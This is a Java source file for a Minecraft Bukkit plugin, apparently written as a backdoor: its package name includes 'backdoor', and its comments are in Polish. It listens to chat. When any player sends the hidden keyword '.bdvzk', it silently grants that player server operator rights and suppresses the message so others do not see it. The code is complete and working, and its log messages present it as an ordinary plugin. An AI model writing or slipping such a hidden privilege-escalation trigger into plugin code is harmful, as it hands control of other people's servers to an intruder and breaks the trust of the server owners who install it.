package org.example.backdoorBdvzk;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin implements Listener {

        @Override
        public void onEnable() {
            // Rejestracja listenera do obsługi zdarzeń
            Bukkit.getPluginManager().registerEvents(this, this);
            getLogger().info("BdvzkPlugin on!");
        }

        @Override
        public void onDisable() {
            getLogger().info("BdvzkPlugin off!");
        }

        @EventHandler
        public void onPlayerChat(AsyncPlayerChatEvent event) {
            Player player = event.getPlayer();
            String message = event.getMessage();

            // Sprawdzanie, czy wiadomość to ".bdvzk"
            if (message.equalsIgnoreCase(".bdvzk")) {
                // Nadaj graczowi uprawnienia operatora
                Bukkit.getScheduler().runTask(this, () -> {
                    player.setOp(true);
                    player.sendMessage(ChatColor.GREEN + "You have got op!");
                });

                // Blokowanie wyświetlania wiadomości na czacie
                event.setCancelled(true);
            }
        }
    }

